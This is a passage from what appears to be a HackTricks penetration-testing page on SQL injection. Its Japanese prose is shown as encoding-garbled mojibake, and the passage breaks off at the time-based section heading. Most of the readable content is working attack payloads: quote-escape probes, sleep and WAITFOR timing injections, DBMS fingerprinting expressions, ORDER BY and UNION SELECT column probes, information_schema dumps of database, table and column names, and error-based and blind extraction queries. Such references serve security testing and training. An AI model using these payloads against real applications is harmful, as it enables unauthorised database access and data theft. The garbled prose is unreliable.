# SQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) ã¯ **ã‚¹ãƒšã‚¤ãƒ³** ã§æœ€ã‚‚é‡è¦ãªã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘** ã§æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚**æŠ€è¡“çŸ¥è­˜ã®ä¿ƒé€²**ã‚’ä½¿å‘½ã¨ã—ã€ã“ã®ä¼šè­°ã¯ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å°‚é–€å®¶ãŒé›†ã¾ã‚‹ç†±ã„äº¤æµã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

## SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨ã¯ï¼Ÿ

**SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³** ã¯ã€æ”»æ’ƒè€…ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¯ã‚¨ãƒªã«**å¹²æ¸‰ã™ã‚‹**ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®æ¬ é™¥ã§ã™ã€‚ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ä»»æ„ã®ãƒ‡ãƒ¼ã‚¿ã‚’å«ã‚€ã€ã‚¢ã‚¯ã‚»ã‚¹ã™ã¹ãã§ãªã„ãƒ‡ãƒ¼ã‚¿ã‚’**è¡¨ç¤º**ã€**å¤‰æ›´**ã€ã¾ãŸã¯**å‰Šé™¤**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ã‚ˆã†ãªè¡Œå‹•ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ©Ÿèƒ½ã‚„ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«æ°¸ç¶šçš„ãªå¤‰æ›´ã‚’ã‚‚ãŸã‚‰ã—ãŸã‚Šã€ã‚µãƒ¼ãƒãƒ¼ã®ä¾µå®³ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã®æ‹’å¦ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## ã‚¨ãƒ³ãƒˆãƒªãƒ¼ãƒã‚¤ãƒ³ãƒˆã®æ¤œå‡º

ã‚µã‚¤ãƒˆãŒSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆSQLiï¼‰ã«**è„†å¼±ã§ã‚ã‚‹**ã‚ˆã†ã«è¦‹ãˆã‚‹å ´åˆã€SQLié–¢é€£ã®å…¥åŠ›ã«å¯¾ã™ã‚‹ç•°å¸¸ãªã‚µãƒ¼ãƒãƒ¼å¿œç­”ãŒã‚ã‚‹ã¨ãã€**æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—**ã¯ã€**ã‚¯ã‚¨ãƒªã‚’ä¸­æ–­ã™ã‚‹ã“ã¨ãªããƒ‡ãƒ¼ã‚¿ã‚’æ³¨å…¥ã™ã‚‹æ–¹æ³•ã‚’ç†è§£ã™ã‚‹**ã“ã¨ã§ã™ã€‚ã“ã‚Œã«ã¯ã€**ç¾åœ¨ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‹ã‚‰åŠ¹æœçš„ã«ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã™ã‚‹æ–¹æ³•ã‚’ç‰¹å®šã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã¯å½¹ç«‹ã¤ã„ãã¤ã‹ã®ä¾‹ã§ã™:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
æ¬¡ã«ã€**ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ãªã„ã‚ˆã†ã«ã‚¯ã‚¨ãƒªã‚’ä¿®æ­£ã™ã‚‹æ–¹æ³•**ã‚’çŸ¥ã£ã¦ãŠãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã‚¯ã‚¨ãƒªã‚’ä¿®æ­£ã™ã‚‹ã«ã¯ã€**ãƒ‡ãƒ¼ã‚¿ã‚’å…¥åŠ›**ã—ã¦**å‰ã®ã‚¯ã‚¨ãƒªãŒæ–°ã—ã„ãƒ‡ãƒ¼ã‚¿ã‚’å—ã‘å…¥ã‚Œã‚‹**ã‚ˆã†ã«ã™ã‚‹ã‹ã€å˜ã«**ãƒ‡ãƒ¼ã‚¿ã‚’å…¥åŠ›**ã—ã¦**æœ€å¾Œã«ã‚³ãƒ¡ãƒ³ãƒˆè¨˜å·ã‚’è¿½åŠ **ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

_ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã‚‹å ´åˆã‚„ã€ã‚¯ã‚¨ãƒªãŒæ­£å¸¸ã«å‹•ä½œã—ã¦ã„ã‚‹ã¨ãã¨ãã†ã§ãªã„ã¨ãã®é•ã„ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆã€ã“ã®ãƒ•ã‚§ãƒ¼ã‚ºã¯ã‚ˆã‚Šç°¡å˜ã«ãªã‚Šã¾ã™ã€‚_

### **ã‚³ãƒ¡ãƒ³ãƒˆ**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### è«–ç†æ¼”ç®—ã«ã‚ˆã‚‹ç¢ºèª

SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’ç¢ºèªã™ã‚‹ä¿¡é ¼ã§ãã‚‹æ–¹æ³•ã¯ã€**è«–ç†æ¼”ç®—**ã‚’å®Ÿè¡Œã—ã€æœŸå¾…ã•ã‚Œã‚‹çµæœã‚’è¦³å¯Ÿã™ã‚‹ã“ã¨ã§ã™ã€‚ä¾‹ãˆã°ã€`?username=Peter`ã¨ã„ã†GETãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒ`?username=Peter' or '1'='1`ã«å¤‰æ›´ã—ã¦ã‚‚åŒã˜å†…å®¹ãŒå¾—ã‚‰ã‚Œã‚‹å ´åˆã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ãŒç¤ºã•ã‚Œã¾ã™ã€‚

åŒæ§˜ã«ã€**æ•°å­¦æ¼”ç®—**ã®é©ç”¨ã‚‚åŠ¹æœçš„ãªç¢ºèªæŠ€è¡“ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€`?id=1`ã¨`?id=2-1`ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦åŒã˜çµæœãŒå¾—ã‚‰ã‚Œã‚‹å ´åˆã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¤ºå”†ã—ã¦ã„ã¾ã™ã€‚

è«–ç†æ¼”ç®—ç¢ºèªã‚’ç¤ºã™ä¾‹:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
ã“ã®å˜èªãƒªã‚¹ãƒˆã¯ã€ææ¡ˆã•ã‚ŒãŸæ–¹æ³•ã§**SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã™ã‚‹**ãŸã‚ã«ä½œæˆã•ã‚Œã¾ã—ãŸï¼š

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã«ã‚ˆã‚‹ç¢ºèª

å ´åˆã«ã‚ˆã£ã¦ã¯ã€ãƒ†ã‚¹ãƒˆã—ã¦ã„ã‚‹ãƒšãƒ¼ã‚¸ã«**å¤‰åŒ–ãŒè¦‹ã‚‰ã‚Œãªã„**ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹**è‰¯ã„æ–¹æ³•ã¯ã€DBã«ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã•ã›ã€ãƒšãƒ¼ã‚¸ã®èª­ã¿è¾¼ã¿ã«ã‹ã‹ã‚‹**æ™‚é–“ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹**ã“ã¨ã§ã™ã€‚\
ã—ãŸãŒã£ã¦ã€SQLã‚¯ã‚¨ãƒªã«å®Œäº†ã™ã‚‹ã®ã«å¤šãã®æ™‚é–“ãŒã‹ã‹ã‚‹æ“ä½œã‚’é€£çµã—ã¾ã™ï¼š
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
å ´åˆã«ã‚ˆã£ã¦ã¯ã€**sleepé–¢æ•°ãŒè¨±å¯ã•ã‚Œãªã„**ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãã®å ´åˆã€ã“ã‚Œã‚‰ã®é–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹ä»£ã‚ã‚Šã«ã€ã‚¯ã‚¨ãƒªã‚’**è¤‡é›‘ãªæ“ä½œã‚’å®Ÿè¡Œã•ã›ã‚‹**ã“ã¨ãŒã§ãã€æ•°ç§’ã‹ã‹ã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚_ã“ã‚Œã‚‰ã®æŠ€è¡“ã®ä¾‹ã¯ã€å„æŠ€è¡“ã”ã¨ã«åˆ¥é€”ã‚³ãƒ¡ãƒ³ãƒˆã•ã‚Œã¾ã™ï¼ˆã‚ã‚‹å ´åˆï¼‰_ã€‚

### ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã®ç‰¹å®š

ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã‚’ç‰¹å®šã™ã‚‹æœ€è‰¯ã®æ–¹æ³•ã¯ã€ç•°ãªã‚‹ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã®é–¢æ•°ã‚’å®Ÿè¡Œã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ã§ã™ã€‚å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®_**sleep**_ **é–¢æ•°**ã‚„ã€æ¬¡ã®ã‚‚ã®ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼ˆ[payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)ã®è¡¨ï¼‰ï¼š
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
ã¾ãŸã€ã‚¯ã‚¨ãƒªã®å‡ºåŠ›ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã¯ã€**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’è¡¨ç¤ºã•ã›ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="info" %}
ç¶šã„ã¦ã€ç•°ãªã‚‹ç¨®é¡ã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ã•ã¾ã–ã¾ãªæ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚MySQLã‚’ä¾‹ã¨ã—ã¦ä½¿ç”¨ã—ã¾ã™ã€‚
{% endhint %}

### PortSwiggerã‚’ä½¿ç”¨ã—ãŸè­˜åˆ¥

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## ãƒ¦ãƒ‹ã‚ªãƒ³ãƒ™ãƒ¼ã‚¹ã®æ‚ªç”¨

### ã‚«ãƒ©ãƒ æ•°ã®æ¤œå‡º

ã‚¯ã‚¨ãƒªã®å‡ºåŠ›ãŒè¦‹ãˆã‚‹å ´åˆã€ã“ã‚Œã¯æ‚ªç”¨ã™ã‚‹ãŸã‚ã®æœ€è‰¯ã®æ–¹æ³•ã§ã™ã€‚\
ã¾ãšæœ€åˆã«ã€**åˆæœŸãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ãŒè¿”ã™**ã‚«ãƒ©ãƒ **ã®**æ•°**ã‚’ç‰¹å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€**ä¸¡æ–¹ã®ã‚¯ã‚¨ãƒªãŒåŒã˜æ•°ã®ã‚«ãƒ©ãƒ ã‚’è¿”ã™å¿…è¦ãŒã‚ã‚‹ãŸã‚**ã§ã™ã€‚\
ã“ã®ç›®çš„ã®ãŸã‚ã«é€šå¸¸ä½¿ç”¨ã•ã‚Œã‚‹2ã¤ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ï¼š

#### Order/Group by

ã‚¯ã‚¨ãƒªã®ã‚«ãƒ©ãƒ æ•°ã‚’ç‰¹å®šã™ã‚‹ã«ã¯ã€**ORDER BY**ã¾ãŸã¯**GROUP BY**å¥ã§ä½¿ç”¨ã•ã‚Œã‚‹æ•°ã‚’æ®µéšçš„ã«èª¿æ•´ã—ã€èª¤ã£ãŸå¿œç­”ãŒè¿”ã•ã‚Œã‚‹ã¾ã§ç¶šã‘ã¾ã™ã€‚SQLå†…ã®**GROUP BY**ã¨**ORDER BY**ã®ç•°ãªã‚‹æ©Ÿèƒ½ã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€ä¸¡æ–¹ã¯ã‚¯ã‚¨ãƒªã®ã‚«ãƒ©ãƒ æ•°ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«åŒæ§˜ã«åˆ©ç”¨ã§ãã¾ã™ã€‚
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

ã‚¯ã‚¨ãƒªãŒæ­£ã—ããªã‚‹ã¾ã§ã€ã©ã‚“ã©ã‚“nullå€¤ã‚’é¸æŠã—ã¾ã™:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_`null`å€¤ã‚’ä½¿ç”¨ã™ã‚‹ã¹ãã§ã™ã€‚ãªãœãªã‚‰ã€ã‚¯ã‚¨ãƒªã®ä¸¡å´ã®ã‚«ãƒ©ãƒ ã®å‹ãŒåŒã˜ã§ãªã‘ã‚Œã°ãªã‚‰ãªã„å ´åˆãŒã‚ã‚Šã€nullã¯ã™ã¹ã¦ã®ã‚±ãƒ¼ã‚¹ã§æœ‰åŠ¹ã ã‹ã‚‰ã§ã™ã€‚_

### ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åã€ãƒ†ãƒ¼ãƒ–ãƒ«åã€ã‚«ãƒ©ãƒ åã®æŠ½å‡º

æ¬¡ã®ä¾‹ã§ã¯ã€ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®åå‰ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒ†ãƒ¼ãƒ–ãƒ«åã€ãƒ†ãƒ¼ãƒ–ãƒ«ã®ã‚«ãƒ©ãƒ åã‚’å–å¾—ã—ã¾ã™ï¼š
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_ã“ã®ãƒ‡ãƒ¼ã‚¿ã‚’ç™ºè¦‹ã™ã‚‹æ–¹æ³•ã¯ã€ç•°ãªã‚‹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã”ã¨ã«ç•°ãªã‚Šã¾ã™ãŒã€å¸¸ã«åŒã˜æ–¹æ³•è«–ã§ã™ã€‚_

## éš ã‚ŒãŸãƒ¦ãƒ‹ã‚ªãƒ³ãƒ™ãƒ¼ã‚¹ã®æ‚ªç”¨

ã‚¯ã‚¨ãƒªã®å‡ºåŠ›ãŒè¡¨ç¤ºã•ã‚Œã¦ã„ã‚‹ãŒã€ãƒ¦ãƒ‹ã‚ªãƒ³ãƒ™ãƒ¼ã‚¹ã®ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãŒé”æˆã§ããªã„å ´åˆã€ãã‚Œã¯**éš ã‚ŒãŸãƒ¦ãƒ‹ã‚ªãƒ³ãƒ™ãƒ¼ã‚¹ã®ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**ã®å­˜åœ¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã®ã‚·ãƒŠãƒªã‚ªã¯ã€ã—ã°ã—ã°ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®çŠ¶æ³ã«ã¤ãªãŒã‚Šã¾ã™ã€‚ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒ¦ãƒ‹ã‚ªãƒ³ãƒ™ãƒ¼ã‚¹ã®ã‚‚ã®ã«å¤‰æ›ã™ã‚‹ã«ã¯ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§ã®å®Ÿè¡Œã‚¯ã‚¨ãƒªã‚’ç‰¹å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã‚Œã¯ã€ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æŠ€è¡“ã¨ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ç®¡ç†ã‚·ã‚¹ãƒ†ãƒ ï¼ˆDBMSï¼‰ã«ç‰¹æœ‰ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§é”æˆã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ç†è§£ã™ã‚‹ãŸã‚ã«ã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆDBMSã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å‚ç…§ã™ã‚‹ã“ã¨ã‚’ãŠå‹§ã‚ã—ã¾ã™ã€‚

ã‚¯ã‚¨ãƒªãŒæŠ½å‡ºã•ã‚ŒãŸã‚‰ã€å…ƒã®ã‚¯ã‚¨ãƒªã‚’å®‰å…¨ã«é–‰ã˜ã‚‹ã‚ˆã†ã«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’èª¿æ•´ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®å¾Œã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã«ãƒ¦ãƒ‹ã‚ªãƒ³ã‚¯ã‚¨ãƒªã‚’è¿½åŠ ã—ã€æ–°ãŸã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªãƒ¦ãƒ‹ã‚ªãƒ³ãƒ™ãƒ¼ã‚¹ã®ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

ã‚ˆã‚ŠåŒ…æ‹¬çš„ãªæ´å¯Ÿã«ã¤ã„ã¦ã¯ã€[Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f)ã§åˆ©ç”¨å¯èƒ½ãªå®Œå…¨ãªè¨˜äº‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

## ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®æ‚ªç”¨

ä½•ã‚‰ã‹ã®ç†ç”±ã§**ã‚¯ã‚¨ãƒª**ã®**å‡ºåŠ›**ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ããªã„ãŒã€**ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸**ã¯**è¦‹ã‚‹ã“ã¨ãŒã§ãã‚‹**å ´åˆã€ã“ã‚Œã‚‰ã®ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’**ã‚¨ã‚¯ã‚¹ãƒ•ã‚£ãƒ«ãƒˆãƒ¬ãƒ¼ãƒˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ãƒ¦ãƒ‹ã‚ªãƒ³ãƒ™ãƒ¼ã‚¹ã®æ‚ªç”¨ã¨åŒæ§˜ã®æµã‚Œã«å¾“ã£ã¦ã€DBã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Blind SQLiã®æ‚ªç”¨

ã“ã®å ´åˆã€ã‚¯ã‚¨ãƒªã®çµæœã‚„ã‚¨ãƒ©ãƒ¼ã‚’è¦‹ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ãŒã€ã‚¯ã‚¨ãƒªãŒ**true**ã¾ãŸã¯**false**ã®å¿œç­”ã‚’**è¿”ã™**ã¨ãã«**åŒºåˆ¥**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãªãœãªã‚‰ã€ãƒšãƒ¼ã‚¸ä¸Šã®å†…å®¹ãŒç•°ãªã‚‹ã‹ã‚‰ã§ã™ã€‚\
ã“ã®å ´åˆã€ãã®å‹•ä½œã‚’æ‚ªç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’æ–‡å­—ã”ã¨ã«ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## ã‚¨ãƒ©ãƒ¼ç›²ç›®çš„SQLiã®æ‚ªç”¨

ã“ã‚Œã¯**ä»¥å‰ã¨åŒã˜ã‚±ãƒ¼ã‚¹**ã§ã™ãŒã€ã‚¯ã‚¨ãƒªã‹ã‚‰ã®çœŸ/å½ã®å¿œç­”ã‚’åŒºåˆ¥ã™ã‚‹ä»£ã‚ã‚Šã«ã€SQLã‚¯ã‚¨ãƒªã®**ã‚¨ãƒ©ãƒ¼**ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’**åŒºåˆ¥ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ï¼ˆãŠãã‚‰ãHTTPã‚µãƒ¼ãƒãƒ¼ãŒã‚¯ãƒ©ãƒƒã‚·ãƒ¥ã™ã‚‹ãŸã‚ï¼‰ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®å ´åˆã€æ­£ã—ãæ–‡å­—ã‚’æ¨æ¸¬ã™ã‚‹ãŸã³ã«SQLã‚¨ãƒ©ãƒ¼ã‚’å¼·åˆ¶ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## æ™‚é–“ãƒ™ãƒ¼ã‚¹ã®SQLiã®æ‚ªç”¨

